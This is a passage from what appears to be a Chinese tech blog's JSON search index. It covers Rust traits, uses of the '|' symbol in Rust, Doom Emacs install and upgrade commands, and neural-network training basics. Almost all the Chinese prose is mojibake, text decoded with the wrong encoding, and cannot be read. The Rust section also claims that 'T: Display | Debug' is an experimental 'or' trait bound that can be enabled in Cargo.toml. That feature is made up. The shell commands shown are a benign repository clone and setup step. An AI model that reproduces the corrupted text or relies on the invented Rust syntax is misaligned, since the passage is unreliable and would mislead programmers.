me.partial_cmp(other) } else if let (Man(me), Man(other)) = (self, other) { // Man åªå’Œ Man ç›¸æ¯”è¾ƒ me.partial_cmp(other) } else { // å…¶ä»–æƒ…å†µä¸æ”¯æŒæ¯”è¾ƒæ“ä½œï¼Œæ¯”è¾ƒæ—¶ä¼šç›´æ¥è¿”å› false None } } } let (man1, man2) = (Man(20), Man(30)); let (dog1, dog2) = (Dog(2), Dog(3)); dbg!(man2 \u003e man1); dbg!(dog2 \u003e dog1); dbg!(man1 \u003e dog1); dbg!(man1.partial_cmp(\u0026dog1)); 1 2 3 4 [src/main.rs:29] man2 \u003e man1 = true [src/main.rs:30] dog2 \u003e dog1 = true [src/main.rs:31] man1 \u003e dog1 = false [src/main.rs:32] man1.partial_cmp(\u0026dog1) = None ä¸Šé¢çš„è¾“å‡ºè¯´æ˜ï¼š\nMan ä¹‹é—´æ˜¯å¯ä»¥è¿›è¡Œæ¯”è¾ƒçš„ Man å’Œ Dog ä¹‹é—´ä¸å¯æ¯”ï¼Œå¦‚æœè¿›è¡Œæ¯”è¾ƒåªä¼šè¿”å› false æˆ–è€… None, å–å†³äºä½¿ç”¨çš„æ˜¯è¿ç®—ç¬¦è¿˜æ˜¯æ–¹æ³•è°ƒç”¨ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œä¸¤ä¸ªå€¼ä¹‹é—´çš„æ¯”è¾ƒï¼Œéµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š\nå½“ä¸”ä»…å½“ partial_cmp(a, b) = Some(Equal)= æ—¶ï¼Œ a == b å½“ä¸”ä»…å½“ partial_cmp(a, b) = Some(Less)= æ—¶ï¼Œ a \u003c b å½“ä¸”ä»…å½“ partial_cmp(a, b) = Some(Greater)= æ—¶ï¼Œ a \u003e b å½“ä¸”ä»…å½“ a \u003c b || a â€‹=â€‹= b= æ—¶ï¼Œ a \u003c= b å½“ä¸”ä»…å½“ a \u003e b || a â€‹=â€‹= b= æ—¶ï¼Œ a \u003e= b å½“ä¸”ä»…å½“ !(a â€‹=â€‹= b)= æ—¶ï¼Œ a != b Ord æ„å‘³ç€ä»»æ„ä¸¤ä¸ªå€¼ä¹‹é—´éƒ½å­˜åœ¨æœ‰æ•ˆçš„é¡ºåº Ord çš„ç”¨æ³•å’Œ PartialOrd ç±»ä¼¼ï¼Œåªä¸è¿‡è¿”å›çš„ç›´æ¥å°±æ˜¯ä¸€ä¸ª Ordering, è€Œé Option\u003cOrdering\u003e, è¿™é‡Œä¸å†ä¸¾ä¾‹è¯´æ˜ã€‚\nç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š\nBTreeSet\u003cT\u003e éœ€è¦å…¶å­˜å‚¨çš„å€¼å®ç° Ord traitã€‚ Clone, Copy Clone å¯ç”¨äºå®ç°å€¼çš„æ·±æ‹·è´ (deep copy), è¿‡ç¨‹å¯èƒ½æ¶‰åŠå¯¹å †æ•°æ®çš„æ‹·è´ã€‚ å®ç° Copy trait çš„ç±»å‹â€‹å¿…é¡»åŒæ—¶å®ç° Clone trait ã€‚å®ƒä»¬æ‰§è¡Œçš„æ˜¯åŒæ ·çš„ä»»åŠ¡ï¼Œåªæ˜¯å®ç° Copy trait æ„å‘³ç€ï¼š æ‹·è´è¿‡ç¨‹æˆæœ¬ä½ï¼Œé€Ÿåº¦å¿«ï¼ˆè¯­æ„å±‚é¢ï¼‰ã€‚ èµ‹å€¼æˆ–ä¼ å‚æ—¶æ— éœ€æ˜¾å¼è°ƒç”¨ clone æ–¹æ³•ï¼ˆè¯­æ³•å±‚é¢ï¼‰ã€‚ ä¸€ä¸ªç»“æ„å¦‚æœè¦ derive Copy trait, è¦æ±‚å…¶å­—æ®µéƒ½å¿…é¡»å®ç°äº† Copy traitã€‚ ç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š\nè°ƒç”¨ slice çš„ to_vec æ–¹æ³•è¦æ±‚å…¶å­˜å‚¨çš„å€¼å®ç° Clone traitã€‚ åœ¨â€œTrait å’Œç”Ÿå‘½å‘¨æœŸâ€ä¸­æˆ‘ä»¬ä¼šå†æ¬¡æåˆ° Copy traitã€‚\nHash ä¸»è¦åœ¨å“ˆå¸Œè¡¨ä¸­åº”ç”¨, HashMap\u003cK, V\u003e è¦æ±‚ key å€¼å®ç° Hash traitã€‚\nDefault Default trait å…è®¸ä»¥ä¸€ç§æƒ¯ç”¨çš„æ–¹å¼åˆ›å»ºç±»å‹çš„é»˜è®¤å€¼ã€‚\nç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š\nåœ¨ç»“æ„ä½“æ›´æ–°è¯­æ³•ä¸­ä½¿ç”¨ï¼š ..Default::default() Option\u003cT\u003e.unwrap_or_default æ–¹æ³•è¦æ±‚ T ç±»å‹å®ç° Default trait ä¸‹é¢æ¼”ç¤ºäº†å¦‚ä½•åœ¨ç»“æ„ä½“æ›´æ–°è¯­æ³•ä¸­ä½¿ç”¨ Default trait æä¾›çš„èƒ½åŠ›ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // é€šè¿‡ derive æŒ‡ä»¤è‡ªåŠ¨è·å¾— Debug, Clone å’Œ Default trait #[derive(Debug, Clone, Default)] struct Rect { left: u32, right: u32, top: u32, bottom: u32, } let r1 = Rect { right: 10, bottom: 10, ..Default::default() }; dbg!(r1); 1 2 3 4 5 6 [src/main.rs:18] r1 = Rect { left: 0, right: 10, top: 0, bottom: 10, } Trait+ ç³»åˆ— è¿™ä¸ªç« èŠ‚ä»‹ç»äº†ä¸€ç³»åˆ— Rust ä¸­åˆ©ç”¨ trait å®ç°çš„é€šç”¨èƒ½åŠ›æˆ–æƒ¯ç”¨æ³•ï¼Œè¿™äº›å†…å®¹ä¹Ÿæ˜¯ Rust ç¼–ç¨‹ä¸­è¾ƒå¸¸è§çš„æ¦‚å¿µã€æ–¹æ³•å’ŒæŠ€å·§ï¼Œå®ç”¨æ€§å¾ˆå¼ºï¼Œæˆ‘ç§°ä¹‹ä¸ºâ€œTrait+ ç³»åˆ—â€ã€‚\nè€ƒè™‘åˆ°ç¯‡å¹…å¤ªé•¿ï¼Œæœ¬ç« èŠ‚å•ç‹¬æ•´ç†æˆæ–‡ï¼Œè¯·å‚é˜…ï¼š Rust Trait+ ç³»åˆ— ã€‚\næ€»ç»“ ä¸Šé¢æ•´ç†äº†ä¸€å¤§å † trait ç›¸å…³çš„åŠŸèƒ½ï¼Œçœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œå®é™…ä¸Šå…¶åº•å±‚å´æ˜¯ä¸€ä¸ªç»Ÿä¸€ã€é€šç”¨çš„æ¦‚å¿µã€‚åªéœ€æŒæ¡ trait è¿™ä¸€å¥—æ¦‚å¿µå’Œç”¨æ³•ï¼Œå°±å¯ä»¥ç±»æ¨åˆ°å„ä¸ªæ–¹é¢ï¼š\nä¸ºå¤–éƒ¨ç±»å‹æ‰©å±•æ–¹æ³• å®ç°â€œæ“ä½œç¬¦é‡è½½â€ æ³›å‹ä¸­çš„ç‰¹å¾çº¦æŸ é¢å‘å¯¹è±¡çš„â€œå¤šæ€â€ ç±»å‹è½¬æ¢ é—­åŒ… æ‰€æœ‰æƒ è§£å¼•ç”¨ è¿­ä»£å™¨ é”™è¯¯å¤„ç† å¹¶å‘ â€¦â€¦ è¿™ç§åœ¨åº•å±‚æ¦‚å¿µå’Œèƒ½åŠ›ä¸Šçš„ç»Ÿä¸€å’Œå¤ç”¨ï¼Œå€¼å¾—æˆ‘ä»¬å­¦ä¹ å’Œå€Ÿé‰´ã€‚\nå‚è€ƒèµ„æ–™ Traits: Defining Shared Behavior Trait objects Abstraction without overhead: traits in Rust Derivable Traits Treating Smart Pointers Like Regular References with the Deref Trait ","description":"","tags":["rust"],"title":"Rust ä¸­çš„ç‰¹å¾ (Trait)","uri":"/posts/traits-in-rust/"},{"categories":null,"content":"Rust ä¸­çš„ | ç”¨é€”æ¯”è¾ƒå¤šï¼Œè¿™é‡Œåšä¸€ä¸ªç®€å•çš„æ•´ç†ã€‚\næ¨¡å¼åŒ¹é…ä¸­çš„â€œæˆ–â€æ¨¡å¼ (Pattern Alternatives) åœ¨æ¨¡å¼åŒ¹é…ï¼ˆå¦‚ match è¯­å¥æˆ– if let è¡¨è¾¾å¼ï¼‰ä¸­ï¼Œ | å¯ä»¥ç”¨æ¥è¡¨ç¤ºå¤šä¸ªæ¨¡å¼çš„ç»„åˆï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 fn process_keypress(\u0026mut self) -\u003e Result\u003c(), std::io::Error\u003e { let pressed_key = read_key()?; if let Key::Ctrl('q') | Key::Ctrl('x') = pressed_key { self.should_quit = true; } // å’Œä¸‹é¢è¿™å¥ç­‰ä»·ï¼š match pressed_key { Key::Ctrl('q') | Key::Ctrl('x') =\u003e self.should_quit = true, _ =\u003e (), } // ... Ok(()) } é—­åŒ…å‚æ•° åœ¨ Rust çš„é—­åŒ…ä¸­ï¼Œ æˆ‘ä»¬åœ¨ä¸¤ä¸ª | ä¹‹é—´å®šä¹‰é—­åŒ…çš„å‚æ•°ï¼š\n1 2 let add_one = |x| x + 1; let result = add_one(5); å‚æ•°å¯ä»¥æœ‰å¤šä¸ªï¼Œä¹Ÿå¯ä»¥ç•™ç©ºã€‚\nä¸¥æ ¼æ„ä¹‰æ¥è¯´ï¼Œåœ¨é—­åŒ…ä¸­çš„ç”¨æ³•ä¸æ˜¯æ“ä½œç¬¦ï¼Œåº”è¯¥ç®—æ˜¯ Rust è¯­æ³•çš„ä¸€éƒ¨åˆ†ã€‚\nä½æˆ– (Bitwise OR) æ“ä½œ è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå’Œå…¶ä»–è¯­è¨€ä¸­ä¸€è‡´ï¼š\n1 2 3 let a = 0b1010; let b = 0b1100; let c = a | b; é€»è¾‘æˆ– || æ“ä½œç¬¦ è¿™ä¸ªä¹Ÿè·Ÿå…¶ä»–è¯­è¨€ä¸€æ ·ï¼Œç”¨äºè¿æ¥ä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼ï¼š\n1 2 3 4 5 6 7 8 let a = true; let b = false; if a || b { println!(\"è‡³å°‘ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸ\"); } else { println!(\"ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸ºå‡\"); } ç±»å‹çº¦æŸä¸­çš„â€œæˆ–â€çº¦æŸ åœ¨ä½¿ç”¨æ³›å‹å’Œ trait æ—¶ï¼Œ | å¯ä»¥ç”¨äºæŒ‡å®šç±»å‹å¿…é¡»å®ç°å¤šä¸ª trait ä¸­çš„ä»»æ„ä¸€ä¸ªï¼ˆç›®å‰è¿™ä¸ªç”¨æ³•è¿˜åœ¨å®éªŒé˜¶æ®µï¼Œéœ€è¦åœ¨ Cargo.toml ä¸­å¯ç”¨ç‰¹å®šçš„ç‰¹æ€§ï¼‰ï¼š\n1 2 3 fn do_something\u003cT: Display | Debug\u003e(value: T) { // ... } åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ T ç±»å‹å‚æ•°å¿…é¡»å®ç° Display æˆ– Debug trait ä¸­çš„è‡³å°‘ä¸€ä¸ªã€‚\n","description":"","tags":["rust"],"title":"Rust ä¸­çš„ | (ç«–çº¿) ç¬¦å·","uri":"/posts/rust-vertical-line/"},{"categories":null,"content":"å®‰è£… 1 2 git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.config/emacs ~/.config/emacs/bin/doom install ç¯å¢ƒå˜é‡ æ‰§è¡Œ doom env å‘½ä»¤ï¼Œå¯ä»¥ dump ä¸€ä»½å½“å‰çš„ shell ç¯å¢ƒå˜é‡ï¼ŒDoom å¯åŠ¨æ—¶ä¼šåŠ è½½è¯¥ç¯å¢ƒå˜é‡ã€‚å¦‚æœä½ çš„ç¯å¢ƒå˜é‡é…ç½®å‘ç”Ÿå˜åŒ–ï¼ˆä¾‹å¦‚ä¿®æ”¹äº† PATH é…ç½®ï¼‰ï¼Œåˆ™åº”è¯¥é‡æ–°æ‰§è¡Œä¸€æ¬¡è¯¥å‘½ä»¤ã€‚\né…ç½® \u0026 åŒæ­¥ é…ç½®ä¸»è¦æ˜¯ä¿®æ”¹ä¸¤ä¸ªæ–‡ä»¶ï¼š\ninit.el ä¸»è¦ç”¨äºé…ç½® Doom çš„æ¨¡å—ï¼Œå¯ä»¥å¼€å¯ã€å…³é—­æ¨¡å—ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æ¨¡å—çš„ä¸€äº›é€‰é¡¹ã€‚ packages.el ä¸»è¦ç”¨äºå®‰è£…ä¸€äº›ç¬¬ä¸‰æ–¹çš„ Emacs æ’ä»¶ï¼Œè¯­æ³•ç±»ä¼¼äº straight-use-package ã€‚å…¶åº•å±‚å°±æ˜¯é€šè¿‡ straight.el æ¥å®ç°çš„ã€‚ â€¼ï¸ ä¸Šè¿°ä¸¤ä¸ªæ–‡ä»¶ä¿®æ”¹ä¹‹å’Œï¼Œéƒ½éœ€è¦æ‰§è¡Œ doom sync å‘½ä»¤ï¼Œå¹¶é‡å¯ Emacs æ‰èƒ½ç”Ÿæ•ˆã€‚\nå‡çº§ å‡çº§åˆ†ä¸¤éƒ¨åˆ†ï¼š\ndoom æœ¬èº«åŠå…¶ç®¡ç†çš„ pacakges packages.el é‡Œé¢å®‰è£…çš„ç¬¬ä¸‰æ–¹ pacakges å‡çº§ doom æœ¬èº«åŠå…¶ç®¡ç†çš„ pacakges doom upgrade å‡çº§ doom åŠå…¶å®‰è£…çš„ pacakges doom build é‡æ–°ç¼–è¯‘æ‰€æœ‰çš„ pacakges ç„¶åé‡å¯ Emacs å³å¯ã€‚ å‡çº§ç¬¬ä¸‰æ–¹ pacakges åœ¨ Emacs ä¸­æ‰§è¡Œ M-x straight-pull-all å‡çº§æ‰€æœ‰çš„ pacakges ã€‚ æˆ–è€…ï¼Œæ‰§è¡Œ M-x straight-pull-package-and-deps å‡çº§æŒ‡å®šçš„ package åŠå…¶å€šèµ–ã€‚ åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œ doom build é‡æ–°ç¼–è¯‘æ‰€æœ‰çš„ pacakges ã€‚ æœ€åï¼Œé‡å¯ Emacs å³å¯ã€‚ è¯Šæ–­ æ‰§è¡Œ doom doctor å‘½ä»¤ï¼Œå¯ä»¥å¯¹ç³»ç»Ÿç¯å¢ƒå’Œé…ç½®è¿›è¡Œè¯Šæ–­ã€‚\nå‚è€ƒ GitHub - doomemacs/doomemacs: An Emacs framework for the stubborn martian hacker ","description":"","tags":["emacs"],"title":"Doom Emacs çš„åŸºæœ¬ç”¨æ³•","uri":"/posts/basic-usage-of-doom-emacs/"},{"categories":null,"content":"æ·±åº¦å­¦ä¹ å’Œç¥ç»ç½‘ç»œ æ·±åº¦å­¦ä¹ æ˜¯ä¸€ç§å®ç°æœºå™¨å­¦ä¹ çš„æŠ€æœ¯ï¼Œè€Œç¥ç»ç½‘ç»œæ˜¯å®ç°æ·±åº¦å­¦ä¹ çš„åŸºæœ¬ç»“æ„ã€‚\nå…·ä½“æ¥è¯´ï¼š\nç¥ç»ç½‘ç»œ:\nç¥ç»ç½‘ç»œæ˜¯ä¸€ç§æ¨¡ä»¿äººè„‘å¤„ç†ä¿¡æ¯æ–¹å¼çš„è®¡ç®—ç³»ç»Ÿã€‚å®ƒç”±å¤§é‡çš„èŠ‚ç‚¹ï¼ˆç¥ç»å…ƒï¼‰ç»„æˆï¼Œè¿™äº›èŠ‚ç‚¹é€šè¿‡å±‚æ¬¡ç»“æ„ç›¸äº’è¿æ¥ã€‚ ç¥ç»ç½‘ç»œå¯ä»¥æ˜¯æµ…å±‚çš„ï¼ˆå°‘æ•°å±‚ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯æ·±å±‚çš„ï¼ˆå¤šå±‚ï¼‰ã€‚æµ…å±‚ç¥ç»ç½‘ç»œå¸¸ç”¨äºè¾ƒç®€å•çš„æ¨¡å¼è¯†åˆ«å’Œæ•°æ®åˆ†ç±»ä»»åŠ¡ã€‚ æ·±åº¦å­¦ä¹ :\næ·±åº¦å­¦ä¹ æ˜¯ä¸€ç§æœºå™¨å­¦ä¹ æŠ€æœ¯ï¼Œå®ƒç‰¹åˆ«ä¾èµ–äºæ·±å±‚ç¥ç»ç½‘ç»œï¼Œå³åŒ…å«å¤šä¸ªéšè—å±‚çš„ç¥ç»ç½‘ç»œã€‚ æ·±å±‚ç¥ç»ç½‘ç»œèƒ½å¤Ÿå­¦ä¹ å’Œæ¨¡æ‹Ÿæ•°æ®ä¸­çš„é«˜åº¦å¤æ‚çš„æ¨¡å¼å’Œå…³ç³»ï¼Œè¿™ä½¿å¾—æ·±åº¦å­¦ä¹ åœ¨å›¾åƒè¯†åˆ«ã€è‡ªç„¶è¯­è¨€å¤„ç†å’Œè®¸å¤šå…¶ä»–é¢†åŸŸéå¸¸æœ‰æ•ˆã€‚ å…³ç³»:\næ‰€æœ‰æ·±åº¦å­¦ä¹ æ¨¡å‹éƒ½æ˜¯ç¥ç»ç½‘ç»œï¼Œä½†å¹¶éæ‰€æœ‰ç¥ç»ç½‘ç»œéƒ½ç”¨äºæ·±åº¦å­¦ä¹ ã€‚æ·±åº¦å­¦ä¹ ç‰¹æŒ‡ä½¿ç”¨æ·±å±‚ç¥ç»ç½‘ç»œæ¥è¿›è¡Œå­¦ä¹ å’Œé¢„æµ‹çš„æ–¹æ³•ã€‚ æ·±åº¦å­¦ä¹ çš„â€œæ·±åº¦â€æŒ‡çš„æ˜¯ç½‘ç»œçš„å±‚æ•°ã€‚æ›´å¤šçš„å±‚ä½¿å¾—ç½‘ç»œèƒ½å¤Ÿæ•è·æ›´å¤æ‚ã€æ›´æŠ½è±¡çš„æ•°æ®ç‰¹å¾ã€‚ ç¥ç»ç½‘ç»œæ˜¯æ„æˆæ·±åº¦å­¦ä¹ çš„åŸºç¡€ï¼Œè€Œæ·±åº¦å­¦ä¹ åˆ™æ˜¯åˆ©ç”¨è¿™äº›ç¥ç»ç½‘ç»œæ¥å®ç°å¤æ‚ä»»åŠ¡çš„å­¦ä¹ æ–¹æ³•ã€‚é€šè¿‡æ„å»ºå’Œè®­ç»ƒæ·±å±‚ç¥ç»ç½‘ç»œï¼Œæ·±åº¦å­¦ä¹ æ¨¡å‹èƒ½å¤Ÿå­¦ä¹ ä»ç®€å•åˆ°å¤æ‚çš„æ•°æ®æ¨¡å¼ï¼Œè§£å†³å„ç§å¤æ‚çš„å®é™…é—®é¢˜ã€‚\nç¥ç»ç½‘ç»œå’Œæ¨¡å‹ ç¥ç»ç½‘ç»œå’Œæ¨¡å‹ä¹‹é—´çš„å…³ç³»å¯ä»¥è¿™æ ·æ¥é˜è¿°ï¼š\nç¥ç»ç½‘ç»œ:\nç¥ç»ç½‘ç»œæ˜¯ä¸€ä¸ªç”±å¤šå±‚ç¥ç»å…ƒç»„æˆçš„è®¡ç®—ç»“æ„ï¼Œç”¨äºæ¨¡æ‹Ÿå¤æ‚çš„å‡½æ•°æ˜ å°„ã€‚æ¯å±‚åŒ…å«è‹¥å¹²ç¥ç»å…ƒï¼Œæ¯ä¸ªç¥ç»å…ƒé€šè¿‡æƒé‡å’Œåå·®ä¸å…¶ä»–ç¥ç»å…ƒç›¸è¿ã€‚ ç¥ç»ç½‘ç»œçš„è®¾è®¡ï¼ˆä¾‹å¦‚ï¼Œå±‚æ•°ã€æ¯å±‚çš„ç¥ç»å…ƒæ•°é‡ã€æ¿€æ´»å‡½æ•°ç­‰ï¼‰å®šä¹‰äº†å…¶ç»“æ„å’Œæ½œåœ¨çš„è®¡ç®—èƒ½åŠ›ã€‚ æ¨¡å‹:\nå½“æˆ‘ä»¬è°ˆè®ºâ€œæ¨¡å‹â€æ—¶ï¼Œé€šå¸¸æŒ‡çš„æ˜¯è®­ç»ƒå¥½çš„ç¥ç»ç½‘ç»œï¼ŒåŒ…æ‹¬å…¶æ‰€æœ‰å‚æ•°ï¼ˆæƒé‡å’Œåå·®ï¼‰çš„ç‰¹å®šè®¾ç½®ã€‚ æ¨¡å‹æ˜¯ç¥ç»ç½‘ç»œè®­ç»ƒè¿‡ç¨‹çš„äº§ç‰©ï¼Œå®ƒæ•æ‰äº†è®­ç»ƒæ•°æ®ä¸­çš„æ¨¡å¼å’Œå…³ç³»ã€‚ è®­ç»ƒè¿‡ç¨‹:\nåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œç¥ç»ç½‘ç»œé€šè¿‡è°ƒæ•´å…¶æƒé‡å’Œåå·®æ¥å­¦ä¹ æ•°æ®ä¸­çš„æ¨¡å¼ã€‚ è¿™äº›è°ƒæ•´æ˜¯é€šè¿‡è®¡ç®—æŸå¤±å‡½æ•°çš„æ¢¯åº¦å¹¶åº”ç”¨ä¼˜åŒ–ç®—æ³•ï¼ˆå¦‚æ¢¯åº¦ä¸‹é™ï¼‰æ¥å®ç°çš„ã€‚ è®­ç»ƒå®Œæˆåï¼Œç½‘ç»œçš„æƒé‡å’Œåå·®è¢«â€œå†»ç»“â€ï¼Œå½¢æˆäº†æœ€ç»ˆçš„æ¨¡å‹ã€‚ å…³ç³»å’Œç†è§£:\nå¯ä»¥å°†ç¥ç»ç½‘ç»œè§†ä¸ºæ¨¡å‹çš„â€œè“å›¾â€ï¼Œè€Œè®­ç»ƒåçš„ç½‘ç»œåˆ™æ˜¯æ ¹æ®è¿™ä¸ªè“å›¾æ„å»ºçš„å…·ä½“å®ä¾‹ã€‚ æ¨¡å‹æ˜¯è®­ç»ƒè¿‡ç¨‹çš„ç»“æœï¼Œå®ƒåŒ…å«äº†ä¸ºäº†æœ€å¤§åŒ–æ€§èƒ½è€Œè°ƒæ•´å’Œä¼˜åŒ–çš„å‚æ•°é›†åˆã€‚ ç»¼ä¸Šï¼Œç¥ç»ç½‘ç»œåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­è‡ªåŠ¨æ›´æ–°å…¶æƒé‡å’Œå‚æ•°ï¼Œè€Œè®­ç»ƒå®Œæˆåï¼Œè¿™äº›ä¼˜åŒ–è¿‡çš„æƒé‡å’Œå‚æ•°å€¼æ„æˆäº†æœ€ç»ˆçš„æ¨¡å‹ã€‚è¿™ä¸ªæ¨¡å‹å¯ä»¥ç”¨æ¥åšé¢„æµ‹æˆ–è¿›ä¸€æ­¥åˆ†æã€‚\nç¥ç»ç½‘ç»œçš„å­¦ä¹ è¿‡ç¨‹ ä»¥å›¾ç‰‡åˆ†ç±»é—®é¢˜ä¸ºä¾‹ï¼š\nåˆå§‹çŠ¶æ€:\nåœ¨è®­ç»ƒå¼€å§‹æ—¶ï¼Œç¥ç»ç½‘ç»œçš„æƒé‡å’Œåå·®é€šå¸¸æ˜¯éšæœºåˆå§‹åŒ–çš„ã€‚è¿™æ„å‘³ç€ç½‘ç»œå¯¹äºåˆ†ç±»ä»»åŠ¡â€œä¸€æ— æ‰€çŸ¥â€ï¼Œå…¶åˆå§‹é¢„æµ‹æ˜¯åŸºäºè¿™äº›éšæœºå‚æ•°ã€‚ å–‚å…¥æ•°æ®:\nç„¶åï¼Œæˆ‘ä»¬å‘ç½‘ç»œå–‚å…¥å¸¦æœ‰æ ‡ç­¾çš„è®­ç»ƒæ•°æ®ã€‚åœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œè¿™é€šå¸¸æ˜¯ä¸€ç»„æ ‡è®°äº†æ­£ç¡®ç±»åˆ«çš„å›¾ç‰‡ã€‚ è¿›è¡Œé¢„æµ‹:\nå¯¹äºæ¯å¼ å›¾ç‰‡ï¼Œç½‘ç»œæ ¹æ®å½“å‰çš„æƒé‡å’Œåå·®è¿›è¡Œé¢„æµ‹ï¼Œå°è¯•åˆ¤æ–­å›¾ç‰‡æ‰€å±çš„ç±»åˆ«ã€‚ åœ¨ PyTorch ä¸­ï¼Œç›¸å½“äº forward() æˆ–è€… model() æ‰€åšçš„äº‹æƒ…ã€‚ è®¡ç®—æŸå¤±:\nç½‘ç»œçš„é¢„æµ‹ç»“æœä¼šä¸å®é™…çš„æ ‡ç­¾è¿›è¡Œæ¯”è¾ƒï¼Œä½¿ç”¨æŸå¤±å‡½æ•°æ¥è®¡ç®—é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®å¼‚ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°ï¼Œåœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¡¡é‡ç½‘ç»œé¢„æµ‹çš„æ¦‚ç‡åˆ†å¸ƒä¸å®é™…æ ‡ç­¾çš„æ¦‚ç‡åˆ†å¸ƒä¹‹é—´çš„å·®å¼‚ã€‚ è°ƒæ•´æƒé‡å’Œåå·®:\næ ¹æ®æŸå¤±å‡½æ•°çš„ç»“æœï¼Œç½‘ç»œé€šè¿‡æ¢¯åº¦ä¸‹é™ï¼ˆæˆ–å…¶ä»–ä¼˜åŒ–ç®—æ³•ï¼‰æ¥è°ƒæ•´å…¶æƒé‡å’Œåå·®ã€‚è¿™ä¸ªè°ƒæ•´æ˜¯ä¸ºäº†å‡å°‘æŸå¤±ï¼Œå³å‡å°‘é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®å¼‚ã€‚ è¿™ä¸ªè¿‡ç¨‹æ¶‰åŠåˆ°è®¡ç®—æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¯ä¸ªæƒé‡å’Œåå·®çš„æ¢¯åº¦ï¼Œç„¶åæŒ‰è¿™äº›æ¢¯åº¦çš„åæ–¹å‘æ¥æ›´æ–°å‚æ•°ã€‚ åœ¨ PyTorch ä¸­ï¼Œç›¸å½“äºæ‰§è¡Œ optimizer.step() ã€‚ è¿­ä»£å’Œå­¦ä¹ :\nè¿™ä¸ªè¿‡ç¨‹åœ¨æ•´ä¸ªè®­ç»ƒé›†ä¸Šåå¤è¿›è¡Œï¼Œç½‘ç»œé€æ¸å­¦ä¹ å¹¶æå‡å…¶é¢„æµ‹çš„å‡†ç¡®æ€§ã€‚ éšç€è®­ç»ƒçš„è¿›è¡Œï¼Œç½‘ç»œèƒ½å¤Ÿæ›´å¥½åœ°ç†è§£æ•°æ®ä¸­çš„æ¨¡å¼å’Œç‰¹å¾ï¼Œä»è€Œåœ¨é¢å¯¹æ–°çš„ã€æœªè§è¿‡çš„æ•°æ®æ—¶ä¹Ÿèƒ½åšå‡ºæ›´å‡†ç¡®çš„é¢„æµ‹ã€‚ ç»¼ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªè¿­ä»£çš„å­¦ä¹ è¿‡ç¨‹ï¼Œç¥ç»ç½‘ç»œé€šè¿‡ä¸æ–­è°ƒæ•´è‡ªèº«çš„å‚æ•°ï¼Œä»¥æœ€å°åŒ–æŸå¤±å‡½æ•°ï¼Œè¿›è€Œæé«˜å¯¹æ•°æ®çš„ç†è§£å’Œåˆ†ç±»çš„å‡†ç¡®æ€§ã€‚\næ‰¹é‡å­¦ä¹ ï¼ˆBatch Learningï¼‰ ç¥ç»ç½‘ç»œåœ¨è®¡ç®—æŸå¤±æ—¶é€šå¸¸é‡‡ç”¨çš„æ˜¯åˆ†ç»„ï¼ˆæ‰¹å¤„ç†ï¼‰çš„æ–¹å¼ã€‚è¿™ç§æ–¹æ³•è¢«ç§°ä¸ºæ‰¹é‡å­¦ä¹ ï¼ˆBatch Learningï¼‰ã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œç½‘ç»œä¸æ˜¯å¯¹æ¯å¼ å›¾ç‰‡å•ç‹¬è¿›è¡Œé¢„æµ‹å’Œè®¡ç®—æŸå¤±ï¼Œè€Œæ˜¯å¯¹ä¸€ç»„å›¾ç‰‡ï¼ˆå³ä¸€ä¸ªæ‰¹æ¬¡ï¼‰è¿›è¡Œé¢„æµ‹ï¼Œç„¶åè®¡ç®—è¿™ä¸ªæ‰¹æ¬¡çš„æ€»æŸå¤±ã€‚ä»¥ä¸‹æ˜¯è¿™ä¸ªè¿‡ç¨‹çš„å…³é”®ç‚¹ï¼š\næ‰¹å¤„ç†ï¼ˆBatchingï¼‰:\nåœ¨è®­ç»ƒç¥ç»ç½‘ç»œæ—¶ï¼Œæ•°æ®é€šå¸¸è¢«åˆ†æˆå°æ‰¹æ¬¡ï¼ˆbatchesï¼‰ã€‚ä¸€ä¸ªæ‰¹æ¬¡åŒ…å«å¤šå¼ å›¾ç‰‡ï¼Œæ‰¹æ¬¡çš„å¤§å°ï¼ˆå³æ‰¹å¤§å°ï¼ŒBatch Sizeï¼‰å¯ä»¥æ ¹æ®éœ€è¦å’Œç¡¬ä»¶èµ„æºè¿›è¡Œè®¾ç½®ã€‚ æ‰¹å¤§å°æ˜¯ä¸€ä¸ªé‡è¦çš„è¶…å‚æ•°ï¼Œå®ƒå½±å“ç€æ¨¡å‹çš„å†…å­˜å ç”¨ã€è®­ç»ƒé€Ÿåº¦å’Œæ”¶æ•›æ€§ã€‚ é¢„æµ‹å’ŒæŸå¤±è®¡ç®—:\nç½‘ç»œå¯¹æ•´ä¸ªæ‰¹æ¬¡çš„æ‰€æœ‰å›¾ç‰‡åŒæ—¶è¿›è¡Œé¢„æµ‹ã€‚ ç„¶åï¼ŒæŸå¤±å‡½æ•°è®¡ç®—æ¯å¼ å›¾ç‰‡çš„é¢„æµ‹ç»“æœä¸å…¶å®é™…æ 